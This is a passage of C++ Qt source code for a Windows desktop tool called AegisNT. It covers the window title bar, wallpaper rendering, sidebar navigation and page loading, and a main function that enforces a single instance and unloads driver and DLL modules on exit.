            CachedWallpaperSize != size())
            RebuildWallpaperCache(WallpaperPath, WallpaperMode);
        if (WallpaperSource.isNull())
            return;

        QPainter Painter(this);
        Painter.setOpacity(std::clamp(ConfigurationValue("Theme", "WallpaperOpacity", KDefaultThemeWallpaperOpacity).toInt(), 5, 100) / 100.0);
        if (WallpaperMode == 3)
            Painter.drawTiledPixmap(rect(), WallpaperSource);
        else if (!CachedWallpaper.isNull())
            Painter.drawPixmap(0, 0, CachedWallpaper);
    }

    void resizeEvent(QResizeEvent *Event) override
    {
        QWidget::resizeEvent(Event);
        CachedWallpaperSize = QSize();
    }

    void moveEvent(QMoveEvent *Event) override
    {
        QWidget::moveEvent(Event);
        if (std::clamp(ConfigurationValue("Theme", "BackgroundMaterial", KDefaultThemeBackgroundMaterial).toInt(), 0, 2) == 2)
            ScheduleBackdropRefresh(this);
    }

    void changeEvent(QEvent *Event) override
    {
        QWidget::changeEvent(Event);
        if (Event->type() == QEvent::WindowStateChange)
        {
            UpdateMaximizeButton();
            ScheduleBackdropRefresh(this);
        }
    }

  private:
    QWidget *CreateTitleBar()
    {
        auto *TitleBar = new QFrame;
        TitleBar->setObjectName("TitleBar");
        const int NativeTitleBarHeight = std::max(32, WindowAgent->windowAttribute("title-bar-height").toInt());
        TitleBar->setFixedHeight(NativeTitleBarHeight);
        auto *Layout = new QHBoxLayout(TitleBar);
        Layout->setContentsMargins(0, 0, 0, 0);
        Layout->setSpacing(0);

        auto *IconButton = new QPushButton;
        IconButton->setObjectName("TitleBarIcon");
        IconButton->setFixedSize(40, NativeTitleBarHeight);
        IconButton->setIcon(windowIcon());
        IconButton->setIconSize(QSize(16, 16));
        IconButton->setToolTip("System menu");
        IconButton->setCursor(Qt::PointingHandCursor);
        auto *WindowTitle = MakeLabel(windowTitle(), 11, KTextPrimary, QFont::Normal);
        WindowTitle->setContentsMargins(2, 0, 12, 0);
        WindowTitle->setAlignment(Qt::AlignLeft | Qt::AlignVCenter);

        const auto CreateSystemButton = [NativeTitleBarHeight](const QString &ObjectName, const wchar_t *Glyph,
                                                               const QString &ToolTip) {
            auto *Button = new QPushButton;
            Button->setObjectName(ObjectName);
            Button->setFixedSize(40, NativeTitleBarHeight);
            QFont CaptionFont;
            CaptionFont.setFamilies({"Segoe Fluent Icons", "Segoe MDL2 Assets"});
            CaptionFont.setPixelSize(10);
            Button->setFont(CaptionFont);
            Button->setText(QString::fromWCharArray(Glyph));
            Button->setToolTip(ToolTip);
            return Button;
        };
        auto *MinimizeButton = CreateSystemButton("TitleBarMinimize", L"\xE921", "Minimize");
        MaximizeButton = CreateSystemButton("TitleBarMaximize", L"\xE922", "Maximize");
        auto *CloseButton = CreateSystemButton("TitleBarClose", L"\xE8BB", "Close");

        Layout->addWidget(IconButton);
        Layout->addWidget(WindowTitle);
        Layout->addStretch();
        Layout->addWidget(MinimizeButton);
        Layout->addWidget(MaximizeButton);
        Layout->addWidget(CloseButton);

        WindowAgent->setTitleBar(TitleBar);
        WindowAgent->setSystemButton(QWK::WindowAgentBase::WindowIcon, IconButton);
        WindowAgent->setSystemButton(QWK::WindowAgentBase::Minimize, MinimizeButton);
        WindowAgent->setSystemButton(QWK::WindowAgentBase::Maximize, MaximizeButton);
        WindowAgent->setSystemButton(QWK::WindowAgentBase::Close, CloseButton);

        QObject::connect(IconButton, &QPushButton::clicked, this, [this, IconButton] {
            WindowAgent->showSystemMenu(IconButton->mapToGlobal(QPoint(0, IconButton->height())));
        });
        QObject::connect(MinimizeButton, &QPushButton::clicked, this, &QWidget::showMinimized);
        QObject::connect(MaximizeButton, &QPushButton::clicked, this, [this] {
            isMaximized() ? showNormal() : showMaximized();
        });
        QObject::connect(CloseButton, &QPushButton::clicked, this, &QWidget::close);
        UpdateMaximizeButton();
        return TitleBar;
    }

    void UpdateMaximizeButton()
    {
        if (!MaximizeButton)
            return;
        const bool Maximized = isMaximized();
        MaximizeButton->setText(QString::fromWCharArray(Maximized ? L"\xE923" : L"\xE922"));
        MaximizeButton->setToolTip(Maximized ? "Restore" : "Maximize");
    }

    void RebuildWallpaperCache(const QString &Path, int Mode)
    {
        if (CachedWallpaperPath != Path)
            WallpaperSource = QPixmap(Path);
        CachedWallpaperPath = Path;
        CachedWallpaperMode = Mode;
        CachedWallpaperSize = size();
        CachedWallpaper = QPixmap();
        if (WallpaperSource.isNull() || Mode == 3 || size().isEmpty())
            return;
        if (Mode == 2)
            CachedWallpaper = WallpaperSource.scaled(size(), Qt::IgnoreAspectRatio, Qt::SmoothTransformation);
        else
        {
            const Qt::AspectRatioMode RatioMode = Mode == 1 ? Qt::KeepAspectRatio : Qt::KeepAspectRatioByExpanding;
            const QPixmap Scaled = WallpaperSource.scaled(size(), RatioMode, Qt::SmoothTransformation);
            CachedWallpaper = QPixmap(size());
            CachedWallpaper.fill(Qt::transparent);
            QPainter Painter(&CachedWallpaper);
            Painter.drawPixmap((width() - Scaled.width()) / 2, (height() - Scaled.height()) / 2, Scaled);
        }
    }

    QWidget *CreateSidebar()
    {
        auto *Sidebar = new QFrame;
        Sidebar->setObjectName("Sidebar");
        Sidebar->setFixedWidth(KSidebarWidth);
        auto *Layout = new QVBoxLayout(Sidebar);
        Layout->setContentsMargins(0, 0, 0, 0);
        Layout->setSpacing(0);

        NavigationPanelWidget = new NavigationPanel(Sidebar);
        NavigationPanelWidget->setFixedWidth(KSidebarWidth);
        NavigationPanelWidget->setExpandWidth(KSidebarWidth);
        NavigationPanelWidget->setMenuButtonVisible(false);
        NavigationPanelWidget->setReturnButtonVisible(false);
        NavigationPanelWidget->setCollapsible(false);
        NavigationPanelWidget->setAcrylicEnabled(false);
        for (int Index = 0; Index < static_cast<int>(KPages.size()); ++Index)
        {
            if (Index == 6)
            {
                NavigationPanelWidget->addItem(
                    "kernel", CreateFluentIcon(Fluent::IconType::DEVELOPER_TOOLS), "Kernel", nullptr, false,
                    NavigationPanel::ItemPosition::SCROLL, "Kernel");
            }
            else if (Index == 10)
            {
                NavigationPanelWidget->addItem(
                    "module", CreateFluentIcon(Fluent::IconType::LIBRARY), "Module", nullptr, false,
                    NavigationPanel::ItemPosition::SCROLL, "Module");
            }
            const auto &Page = KPages[Index];
            const QString Route = QString::number(Index);
            QString ParentRoute;
            if ((Index >= 6 && Index <= 9) || Index == 15 || Index == 16)
                ParentRoute = "kernel";
            else if (Index >= 10 && Index <= 12)
                ParentRoute = "module";
            NavigationPanelWidget->addItem(
                Route, CreateFluentIcon(Page.Icon), Page.Title, [this, Index] { SelectPage(Index); }, true,
                NavigationPanel::ItemPosition::SCROLL, Page.Title, ParentRoute);
        }
        Layout->addWidget(NavigationPanelWidget, 1);
        NavigationPanelWidget->expand(false);
        return Sidebar;
    }

    QWidget *CreateContent()
    {
        auto *Content = new QWidget;
        Content->setObjectName("Content");
        auto *Layout = new QVBoxLayout(Content);
        Layout->setContentsMargins(32, 27, 32, 32);
        Layout->setSpacing(0);

        TitleLabelWidget = MakeLabel("", 23, KAccent, QFont::DemiBold);
        TitleLabelWidget->setFixedHeight(46);
        SubtitleLabelWidget = MakeLabel("", 11, KTextMuted);
        SubtitleLabelWidget->setFixedHeight(30);
        Layout->addWidget(TitleLabelWidget);
        Layout->addSpacing(8);
        Layout->addWidget(SubtitleLabelWidget);
        Layout->addSpacing(22);

        PageStack = new StackedWidget(nullptr, AnimationType::PopUp);
        PageStack->setAnimationEnabled(false);
        for (int Index = 0; Index < static_cast<int>(KPages.size()); ++Index)
        {
            auto *Container = new QWidget;
            auto *ContainerLayout = new QVBoxLayout(Container);
            ContainerLayout->setContentsMargins(0, 0, 0, 0);
            ContainerLayout->setSpacing(0);
            PageContainers[Index] = Container;
            PageStack->addWidget(Container, 0, 12);
        }
        PageStack->setCurrentIndex(0, false, 0, false);
        Layout->addWidget(PageStack, 1);
        return Content;
    }

    void SelectPage(int Index, bool Animate = true)
    {
        if (Index < 0 || Index >= static_cast<int>(KPages.size()))
            return;
        const bool WasLoaded = PageLoaded[Index];
        EnsurePageLoaded(Index);
        NavigationPanelWidget->setCurrentItem(QString::number(Index));
        TitleLabelWidget->setText(KPages[Index].Title);
        SubtitleLabelWidget->setText(KPages[Index].Subtitle);
        PageStack->setCurrentIndex(Index, Animate && WasLoaded, 120, false);
        if (std::clamp(ConfigurationValue("Theme", "BackgroundMaterial", KDefaultThemeBackgroundMaterial).toInt(), 0, 2) == 2)
            ScheduleBackdropRefresh(this);
    }

    void EnsurePageLoaded(int Index)
    {
        if (PageLoaded[Index])
            return;
        QWidget *Body = CreatePageBody(Index);
        PageContainers[Index]->layout()->addWidget(Body);
        PageLoaded[Index] = true;
    }

    void ApplyStyleSheet()
    {
        setStyleSheet(ApplicationStyleSheet());
    }

    NavigationPanel *NavigationPanelWidget = nullptr;
    QWK::WidgetWindowAgent *WindowAgent = nullptr;
    QPushButton *MaximizeButton = nullptr;
    FluentLabelBase *TitleLabelWidget = nullptr;
    FluentLabelBase *SubtitleLabelWidget = nullptr;
    StackedWidget *PageStack = nullptr;
    std::array<QWidget *, KPages.size()> PageContainers{};
    std::array<bool, KPages.size()> PageLoaded{};
    QString CachedWallpaperPath;
    int CachedWallpaperMode = -1;
    QSize CachedWallpaperSize;
    QPixmap WallpaperSource;
    QPixmap CachedWallpaper;
};

} 

int main(int Argc, char *Argv[])
{
    HANDLE SingleInstanceMutex = CreateMutexW(nullptr, FALSE, L"Local\\AegisNT_SingleInstance");
    if (SingleInstanceMutex && GetLastError() == ERROR_ALREADY_EXISTS)
    {
        MessageBoxW(nullptr, L"AegisNT is already running.", L"AegisNT", MB_OK | MB_ICONINFORMATION);
        CloseHandle(SingleInstanceMutex);
        return 0;
    }

    QGuiApplication::setAttribute(Qt::AA_DontCreateNativeWidgetSiblings);
    QApplication Application(Argc, Argv);
    Application.setApplicationName("AegisNT");
    Application.setApplicationDisplayName("AegisNT");
    Application.setOrganizationName("AegisNT");
    LoadConfiguration();
    EnsureThemeConfiguration();
    ApplyConfiguredAppearance(nullptr);

    int Result = 0;
    {
        WindowsToolWindow Window;
        const QRect Available = Window.screen()->availableGeometry();
        const int ConfiguredWidth = ConfigurationValue("Application", "Width", 1600).toInt();
        const int ConfiguredHeight = ConfigurationValue("Application", "Height", 1000).toInt();
        const int Width = std::min(ConfiguredWidth, std::max(900, Available.width() - 40));
        const int Height = std::min(ConfiguredHeight, std::max(620, Available.height() - 40));
        Window.resize(Width, Height);
        Window.show();
        Result = Application.exec();
    }

    if (ActiveConsoleProcess && ActiveConsoleProcess->state() != QProcess::NotRunning)
    {
        ActiveConsoleProcess->kill();
        ActiveConsoleProcess->waitForFinished(1000);
    }
    if (ModuleRunning.load() && !RunningModulePath.isEmpty())
    {
        if (ModuleEntry *RunningModule = FindDllModule(RunningModulePath); RunningModule && RunningModule->Handle)
        {
            const auto StopModule = reinterpret_cast<void (*)()>(GetProcAddress(RunningModule->Handle, "StopModule"));
            if (StopModule)
                StopModule();
        }
    }
    for (ModuleEntry &Driver : DriverModules)
    {
        if (Driver.Loaded)
            SetDriverLoaded(Driver, false);
    }
    if (!ModuleRunning.load())
    {
        for (ModuleEntry &Module : DllModules)
            DestroyModuleInstance(Module);
    }
    if (SingleInstanceMutex)
        CloseHandle(SingleInstanceMutex);
    return Result;
}
